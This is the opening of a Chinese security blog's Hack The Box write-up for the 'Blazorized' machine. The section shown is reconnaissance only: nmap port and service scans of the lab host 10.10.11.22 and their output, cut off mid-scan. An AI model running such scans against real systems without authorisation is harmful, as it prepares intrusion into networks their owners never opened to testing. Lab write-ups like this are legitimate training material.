@@ -1,0 +1,1182 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/HTB/Windows-Blazorized/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>信息搜集 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              信息搜集
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="_1">信息搜集<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>┌──(root㉿kali)-[/home/tom/桌面]
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>└─# nmap --min-rate 10000 -p- -Pn 10.10.11.22   
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>...
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>PORT      STATE SERVICE
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>25/tcp    open  smtp
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>53/tcp    open  domain
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>80/tcp    open  http
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>110/tcp   open  pop3
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>135/tcp   open  msrpc
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>139/tcp   open  netbios-ssn
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>445/tcp   open  microsoft-ds
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>593/tcp   open  http-rpc-epmap
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>5985/tcp  open  wsman
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>9389/tcp  open  adws
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>47001/tcp open  winrm
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>...
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>┌──(root㉿kali)-[/home/tom/桌面]
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>└─# nmap -sT -sC -sV -O -p25,53,80,110,135,139,445,593,5985,9389,47001  10.10.11.22
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>...
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>PORT      STATE SERVICE       VERSION
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>25/tcp    open  smtp?
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>|_smtp-commands: Couldn&#39;t establish connection on port 25
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>53/tcp    open  domain        Simple DNS Plus
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>80/tcp    open  http          Microsoft IIS httpd 10.0
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>|_http-title: Did not follow redirect to http://blazorized.htb
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>|_http-server-header: Microsoft-IIS/10.0
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>110/tcp   open  pop3?
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>135/tcp   open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>445/tcp   open  microsoft-ds?
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>|_http-title: Not Found
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>9389/tcp  open  mc-nmf        .NET Message Framing
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>|_http-title: Not Found
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>Device type: general purpose
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>Running: Microsoft Windows XP|7|2012
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>OS details: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>
+<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>Host script results:
+<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>|_clock-skew: -1s
+<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>| smb2-time: 
+<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>|   date: 2024-07-29T20:34:23
+<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>|_  start_date: N/A
+<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>| smb2-security-mode: 
+<a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>|   3:1:1: 
